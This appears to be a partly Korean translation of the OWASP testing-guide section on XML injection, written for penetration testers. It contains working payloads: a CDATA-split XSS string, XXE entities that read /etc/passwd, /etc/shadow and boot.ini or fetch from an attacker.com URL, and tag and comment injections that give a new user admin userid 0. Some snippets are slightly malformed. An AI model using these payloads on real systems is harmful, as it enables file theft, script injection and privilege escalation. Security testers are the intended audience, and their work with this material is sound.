============================================================================================
OTG-INPVAL-008
============================================================================================

|

XML 인젝션 테스트

|

Summary
============================================================================================

XML 인젝션 테스트는 침투 테스터가 어플리케이션에 XML 문서를 삽입하려 할 때 입니다.
만약 XML 파서가 문맥 데이터를 검증하는데 실패하면, 테스트가 긍정적인 결과를 산출할 것입니다.
이 섹션은 XML 삽입의 실제 사례를 설명합니다.
우선 XML 스타일의 통신을 정의하고, 그 동작 원리를 설명합니다.
그런 다음, XML 메타 문자를 삽입하는 검색 방법에 대해 설명합니다.
첫번째 단계가 수행되면, 침투 테스터는 XML 구조에 대한 정보를 가지고, 
XML 데이터 및 태그를 인젝션 시도하는 것이 가능할 것입니다

|

How to Test
============================================================================================

아래 처럼 사용자 등록을 수행하기 위해 XML 스타일 통신을 사용하는 웹 어플리케이션이 있다고 가정합니다.
계정이 생성이 되면, xmlDb 파일에 <user> 노드가 새로 추가됩니다.

.. code-block:: xml

    <?xml version=”1.0” encoding=”ISO-8859-1”?>
    <users>
        <user>
            <username>gandalf</username>
            <password>!c3</password>
            <userid>0</userid>
            <mail>gandalf@middleearth.com</mail>
        </user>
        <user>
            <username>Stefan0</username>
            <password>w1s3c</password>
            <userid>500</userid>
            <mail>Stefan0@whysec.hmm</mail>
        </user>
    </users>


예를 들어, 다음 값이 있습니다.

.. code-block:: xml

    Username: tony
    Password: Un6R34kb!e
    E-mail: s4tan@hell.com

요청을 진행합니다.

.. code-block:: console

    http://www.example.com/addUser.php?username=tony&password=Un6R34kb!e&email=s4tan@hell.com

어플리케이션에서는 다음 노드가 빌드됩니다.

.. code-block:: xml

    <user> 
        <username>tony</username> 
        <password>Un6R34kb!e</password>
        <userid>500</userid>
        <mail>s4tan@hell.com</mail> 
    </user>

다음 xmlDB에 추가될 것입니다.

.. code-block:: xml

    <?xml version="1.0" encoding="ISO-8859-1"?> 
    <users> 
        <user>
            <username>gandalf</username>
            <password>!c3</password>
            <userid>0</userid>
            <mail>gandalf@middleearth.com</mail> 
        </user> 
        <user>
            <username>Stefan0</username>
            <password>w1s3c</password>
            <userid>500</userid>
            <mail>Stefan0@whysec.hmm</mail> 
        </user> 
        <user>
            <username>tony</username>
            <password>Un6R34kb!e</password>
            <userid>500</userid>
            <mail>s4tan@hell.com</mail> 
        </user> 
    </users> 

|

Discovery
-------------------------------------------------------------------------------------------

어플리케이션에 XML 삽입 취약점이 존재하는지 테스트하기 위해 XML 메타 문자를 삽입하는 부분을 
확인합니다.

**XML metacharacters**

- 싱글 쿼트: ' 

필터링하지 않을 경우, 인젝션된 값이 태그의 속성 값의 일부가 될 것입니다. XML 파싱 동안 예외가 발생될 수 있습니다.

예를 들어 다음과 같은 속성이 있다고 가정합니다.

.. code-block:: xml

    <node attrib='$inputValue'/

그래서 만약 아래와 같이 삽입되면 다음과 같이 속성 값이 삽입됩니다.

.. code-block:: xml

    inputValue = foo'

    <node attrib='foo''/> 

then, the resulting XML document is not well formed. 

|

- 더블 쿼트: " 

이 문자도 싱글 쿼트와 같으며, 속성 값이 더블 쿼트로 묶여 있는 경우 사용될 수 있습니다.

.. code-block:: xml

    <node attrib="$inputValue"/> 

그래서 만약 아래와 같이 삽입되면 다음과 같이 속성 값이 삽입됩니다.

.. code-block:: xml

    $inputValue = foo" 

    <node attrib="foo""/> 

and the resulting XML document is invalid. 

|

- 부등 기호: >, < 

다음과 같이 입력 부분에 개방 또는 폐쇄 괄호를 추가합니다.

.. code-block:: xml

    Username = foo< 

어플리케이션에 다음과 같이 빌드됩니다.

.. code-block:: xml

    <user> 
        <username>foo<</username> 
        <password>Un6R34kb!e</password> 
        <userid>500</userid>
        <mail>s4tan@hell.com</mail> 
    </user> 

but, because of the presence of the open '<', the resulting XML document is invalid. 

|

- 주석 태그: <!--/--> 

해당 문자열은 주석의 시작과 종료로 해석됩니다. 

.. code-block:: xml

    Username = foo<!-

어플리케이션에서 다음과 같이 입력되게 됩니다.

.. code-block:: xml

    <user> 
        <username>foo<!--</username> 
        <password>Un6R34kb!e</password> 
        <userid>500</userid>
        <mail>s4tan@hell.com</mail> 
    </user> 

which won't be a valid XML sequence. 

|

- 앰퍼센드: & 

앰퍼센드는 엔티티를 표현하기 위한 XML 구문으로 사용됩니다. 엔티티의 형식은 '&symbol;' 입니다.
앤티티는 유니 코드 문자 집합의 문자에 매핑된다.

[예제]

.. code-block:: xml
    
    <tagnode>&lt;</tagnode> 

위 문자는 '<' 로 표현됩니다.

만약 '&' 가 &amp; 로 자체 인코딩되지 않아, XML 인젝션을 테스트하는 데 사용됩니다. 

사실상, 만약 입력이 다음과 같다면 새로운 노드가 아래와 같이 생성될 것입니다.

.. code-block:: xml

    Username = &foo 


.. code-block:: xml

    <user> 
        <username>&foo</username> 
        <password>Un6R34kb!e</password> 
        <userid>500</userid> 
        <mail>s4tan@hell.com</mail> 
    </user> 

but, again, the document is not valid: &foo is not terminated with ';' and the &foo; entity is undefined. 

|

- CDATA section delimiters: <![CDATA[ / ]]> 

CDATA sections are used to escape blocks of text containing characters which would otherwise be recognized as markup. In other words, characters enclosed in a CDATA section are not parsed by an XML parser. For example, if there is the need to represent the string '<foo>' inside a text node, a CDATA section may be used: 

.. code-block:: xml

    <node>
        <![CDATA[<foo>]]> 
    </node>

so that '<foo>' won't be parsed as markup and will be considered as character data. 

If a node is built in the following way: 

.. code-block:: xml

    <username><![CDATA[<$userName]]></username> 

the tester could try to inject the end CDATA string ']]>' in order to try to invalidate the XML document. 

.. code-block:: xml

    userName = ]]> 

this will become: 

.. code-block:: xml

    <username><![CDATA[]]>]]></username> 

which is not a valid XML fragment. 

Another test is related to CDATA tag. Suppose that the XML document is processed to generate an HTML page. In this case, the CDATA section delimiters may be simply eliminated, without further inspecting their contents. Then, it is possible to inject HTML tags, which will be included in the generated page, completely bypassing existing sanitization routines. 

Let's consider a concrete example. Suppose we have a node containing some text that will be displayed back to the user. 

.. code-block:: xml

    <html>
        $HTMLCode
    </html> 

Then, an attacker can provide the following input: 

.. code-block:: xml

    $HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]> 

and obtain the following node: 

.. code-block:: xml

    <html>
        <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/ script<![CDATA[>]]> 
    </html> 

During the processing, the CDATA section delimiters are eliminated, generating the following HTML code: 

.. code-block:: xml

    <script>alert('XSS')</script> 

The result is that the application is vulnerable to XSS. 


**External Entity:**

The set of valid entities can be extended by defining new entities. If the definition of an entity is a URI, the entity is called an external entity. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote systems. This behavior exposes the application to XML eXternal Entity (XXE) attacks, which can be used to perform denial of service of the local system, gain unauthorized access to files on the local machine, scan remote machines, and perform denial of service of remote systems. 

To test for XXE vulnerabilities, one can use the following input: 

.. code-block:: xml

    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ 
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file://dev/random" >]><foo>&xxe;
    </foo> 

This test could crash the web server (on a UNIX system), if the XML parser attempts to substitute the entity with the contents of the /dev/random file. 
Other useful tests are the following: 

.. code-block:: xml

    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >

    <!ENTITY xxe SYSTEM "file://etc/passwd" >]><foo>&xxe;</foo>
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >

    <!ENTITY xxe SYSTEM "file://etc/shadow" >]><foo>&xxe;</foo>
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >

    <!ENTITY xxe SYSTEM "file://c:/boot.ini" >]><foo>&xxe;</foo>
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" 
    >]><foo>&xxe;</foo> 

|

Tag Injection 
-------------------------------------------------------------------------------------------

Once the first step is accomplished, the tester will have some information about the structure of the XML document. Then, it is possible to try to inject XML data and tags. We will show an example of how this can lead to a privilege escalation attack.

Let's considering the previous application. By inserting the following values: 

.. code-block:: xml

    Username: tony 
    Password: Un6R34kb!e 
    E-mail: s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com 

the application will build a new node and append it to the XML database: 

.. code-block:: xml

    <?xml version="1.0" encoding="ISO-8859-1"?> 
    <users> 
        <user>
            <username>gandalf</username>
            <password>!c3</password>
            <userid>0</userid>
            <mail>gandalf@middleearth.com</mail> 
        </user> 
        <user>
            <username>Stefan0</username>
            <password>w1s3c</password>
            <userid>500</userid>
            <mail>Stefan0@whysec.hmm</mail> 
        </user> 
        <user>
            <username>tony</username>
            <password>Un6R34kb!e</password>
            <userid>500</userid>
            <mail>s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com</mail> 
        </user>
    </users> 

The resulting XML file is well formed. Furthermore, it is likely that, for the user tony, the value associated with the userid tag is the one appearing last, i.e., 0 (the admin ID). In other words, we have injected a user with administrative privileges. The only problem is that the userid tag appears twice in the last user node. Often, XML documents are associated with a schema or a DTD and will be rejected if they don't comply with it. 

Let's suppose that the XML document is specified by the following DTD: 

.. code-block:: xml

    <!DOCTYPE users [
        <!ELEMENT users (user+) >
        <!ELEMENT user (username,password,userid,mail+) >
        <!ELEMENT username (#PCDATA) >
        <!ELEMENT password (#PCDATA) >
        <!ELEMENT userid (#PCDATA) >
        <!ELEMENT mail (#PCDATA) > 
    ]> 

Note that the userid node is defined with cardinality 1. In this case, the attack we have shown before (and other simple attacks) will not work, if the XML document is validated against its DTD before any processing occurs. 

However, this problem can be solved, if the tester controls the value of some nodes preceding the offending node (userid, in this example). In fact, the tester can comment out such node, by injecting a comment start/end sequence: 

.. code-block:: xml

    Username: tony 
    Password: Un6R34kb!e</password>
    <!-E-mail: --><userid>0</userid><mail>s4tan@hell.com 

In this case, the final XML database is: 

.. code-block:: xml

    <?xml version="1.0" encoding="ISO-8859-1"?> 
    <users>
        <user>
            <username>gandalf</username>
            <password>!c3</password>
            <userid>0</userid>
            <mail>gandalf@middleearth.com</mail> 
        </user>
        <user>
            <username>Stefan0</username>
            <password>w1s3c</password> 
            <userid>500</userid> 
            <mail>Stefan0@whysec.hmm</mail> 
        </user> 
        <user> 
            <username>tony</username> 
            <password>Un6R34kb!e</password><!--</password> 
            <userid>500</userid> 
            <mail>--><userid>0</userid><mail>s4tan@hell.com</mail> 
        </user> 
    </users> 


The original userid node has been commented out, leaving only the injected one. The document now complies with its DTD rules. 

|

Tools 
============================================================================================

- XML Injection Fuzz Strings (from wfuzz tool) - 

https://wfuzz.googlecode.com/svn/trunk/wordlist/Injections/ XML.txt 

|

References 
============================================================================================

**Whitepapers**
 
Alex Stamos: "Attacking Web Services" - 

http://www.owasp.org/images/d/d1/AppSec2005DC-Alex_Stamos-Attacking_Web_Services.ppt 

Gregory Steuck, "XXE (Xml eXternal Entity) attack", 

http://www.securityfocus.com/archive/1/297714 

|